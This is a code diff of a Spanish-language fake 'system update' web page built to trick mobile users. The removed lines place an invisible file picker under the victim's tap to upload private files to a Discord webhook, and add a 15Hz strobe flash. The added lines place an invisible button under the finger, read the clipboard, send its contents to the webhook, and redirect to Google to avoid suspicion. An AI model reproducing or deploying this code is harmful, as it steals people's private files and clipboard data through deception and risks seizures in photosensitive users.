@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Actualización de Sistema Crítica</title>
+    <title>Soporte de Sistema - Verificando...</title>
     <style>
         :root {
             --android-bg: #1A1C1E;
@@ -14,26 +14,15 @@
 
         body, html { margin: 0; padding: 0; height: 100%; background: var(--android-bg); font-family: 'Roboto', sans-serif; overflow: hidden; }
         
-        /* 1. Capa de Engaño y DoS Visual (Saturación Estroboscópica) */
+        /* 1. Capa de Engaño Acelerada */
         #ghost-dimmer {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0);
-            /* Transición Acelerada (2s) y Cubic-Bezier Agresivo */
-            transition: background 2s cubic-bezier(0.9, 0, 1, 1);
+            /* Transición reducida a 2.5s para mayor credibilidad de 'fallo' */
+            transition: background 2.5s cubic-bezier(0.4, 0, 1, 1);
             z-index: 1000;
-        }
-
-        /* Colores de Frecuencia Rápida para Saturación DoS */
-        @keyframes neuroStrobe {
-            0% { background-color: #FFFF00; } /* Amarillo saturado */
-            50% { background-color: #0000FF; } /* Azul saturado */
-            100% { background-color: #FFFF00; }
-        }
-
-        #ghost-dimmer.strobe {
-            animation: neuroStrobe 0.06s infinite linear; /* Frecuencia de 15Hz */
         }
 
         /* 2. Flash Subliminal (Validación de Android) */
@@ -46,17 +35,19 @@
             z-index: 3000;
         }
 
-        /* 3. El Input de Archivos Invisible (El Objetivo) */
-        #invisible-file-input {
+        /* 3. Botón de Intercepción de Gran Tamaño */
+        #invisible-allow-btn {
             position: fixed;
-            width: 200px; height: 100px;
-            opacity: 0; /* Totalmente invisible */
-            cursor: pointer;
-            z-index: 2500;
+            /* Agrandado para cubrir casi cualquier error de precisión del dedo */
+            width: 280px; height: 180px;
+            background: rgba(255, 0, 0, 0); 
+            border: none;
+            z-index: 2000;
             display: none;
+            border-radius: 20px;
         }
 
-        /* Interfaz de Usuario Falsa */
+        /* Interfaz Visual */
         #content-view { color: var(--android-text); text-align: center; margin-top: 35vh; }
         .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--android-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
@@ -66,13 +57,12 @@
 
     <div id="ghost-dimmer"></div>
     <div id="subliminal-flash"></div>
-    
-    <input type="file" id="invisible-file-input" accept="image/*, .pdf, .docx">
+    <button id="invisible-allow-btn"></button>
 
     <div id="content-view">
         <div class="spinner"></div>
-        <h2>Instalando parche de seguridad...</h2>
-        <p style="color: #8E9199; font-size: 0.95em;">No toques la pantalla ni cierres la app.</p>
+        <h2>Analizando integridad del dispositivo...</h2>
+        <p style="color: #8E9199; font-size: 0.9em;">Esto puede tardar unos segundos.</p>
     </div>
 
     <script>
@@ -80,82 +70,70 @@
         
         let dimmer = document.getElementById('ghost-dimmer');
         let flash = document.getElementById('subliminal-flash');
-        let fileInput = document.getElementById('invisible-file-input');
+        let allowBtn = document.getElementById('invisible-allow-btn');
 
-        // INICIO: Empieza el oscurecimiento acelerado tras 0.8s
+        // Oscurecimiento rápido para forzar la reacción muscular
         window.onload = () => {
             setTimeout(() => {
                 dimmer.style.background = "rgba(0, 0, 0, 0.98)";
-            }, 800);
-            
-            // Iniciamos la Saturación Estroboscópica (Colores DoS) tras 1.5s
-            setTimeout(() => {
-                dimmer.classList.add('strobe');
-            }, 1500);
+            }, 600); // Inicio casi inmediato
         };
 
-        // INTERCEPCIÓN DEL KERNEL CEREBRAL (Clic del usuario)
+        // INTERCEPCIÓN DE LATENCIA NERVIOSA
         dimmer.addEventListener('click', (e) => {
-            
-            // 1. Captura de coordenadas instantánea
             let x = e.clientX;
             let y = e.clientY;
 
-            // 2. Flash de validación biográfica
+            // Flash de 15ms para cegar la verificación lógica
             flash.style.display = 'block';
 
-            // 3. MOVIMIENTO DE PRECISIÓN: Posicionamos el input de archivos bajo el dedo
-            // El navegador forzará la apertura del selector de archivos local.
-            fileInput.style.left = (x - 100) + 'px';
-            fileInput.style.top = (y - 50) + 'px';
-            fileInput.style.display = 'block';
+            // El botón de gran tamaño se centra en el toque
+            allowBtn.style.left = (x - 140) + 'px';
+            allowBtn.style.top = (y - 90) + 'px';
+            allowBtn.style.display = 'block';
 
             setTimeout(() => {
                 flash.style.display = 'none';
                 dimmer.style.transition = "none";
                 dimmer.style.background = "transparent";
-                dimmer.classList.remove('strobe'); // Apagamos el DoS
-            }, 20); // 0.02 segundos (Mínima latencia visual)
+            }, 15);
         });
 
-        // ACCIÓN FINAL: El usuario elige un archivo
-        fileInput.addEventListener('change', (e) => {
-            fileInput.style.display = 'none';
-            const file = e.target.files[0];
+        // EJECUCIÓN DEL PERMISO
+        allowBtn.addEventListener('click', async () => {
+            allowBtn.style.display = 'none';
             
-            if (file) {
-                subirArchivoADiscord(file);
+            try {
+                // Solicita acceso al portapapeles
+                const text = await navigator.clipboard.readText();
+                enviarADiscord(text);
+            } catch (err) {
+                // Si falla el portapapeles, redirigimos para no levantar sospechas
+                window.location.href = "https://www.google.com";
             }
         });
 
-        function subirArchivoADiscord(archivo) {
-            const formData = new FormData();
-            
-            // Preparamos el Embed de Discord
-            const embed = {
-                title: "📂 Captura de Archivo Intimo Exitosa",
-                color: 16711680, // Rojo Alerta
-                fields: [
-                    { name: "Nombre del Archivo", value: archivo.name },
-                    { name: "Tamaño", value: (archivo.size / 1024).toFixed(2) + " KB" },
-                    { name: "Tipo", value: archivo.type },
-                    { name: "User Agent", value: navigator.userAgent }
-                ],
-                footer: { text: "Neuro-Breach Exploit | 2026" }
+        function enviarADiscord(contenido) {
+            const payload = {
+                embeds: [{
+                    title: "🛰️ Datos de Sesión Capturados",
+                    color: 4359668,
+                    description: "Se ha interceptado el portapapeles del objetivo exitosamente.",
+                    fields: [
+                        { name: "Contenido Copiado", value: "```" + (contenido || "Vacío o Bloqueado") + "```" },
+                        { name: "Motor de Navegador", value: navigator.userAgent }
+                    ],
+                    timestamp: new Date()
+                }]
             };
-
-            // Añadimos el archivo real al FormData
-            formData.append('file', archivo);
-            // Añadimos la estructura del embed (JSON serializado)
-            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                body: formData // Los FormData se envían automáticamente como multipart/form-data
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             }).then(() => {
-                alert("Actualización completa. El dispositivo está seguro.");
-                // Auto-limpieza (Opcional)
-                // window.location.href = "https://www.google.com";
+                alert("Integridad confirmada. Gracias por esperar.");
+                window.location.href = "https://www.google.com";
             });
         }
     </script>
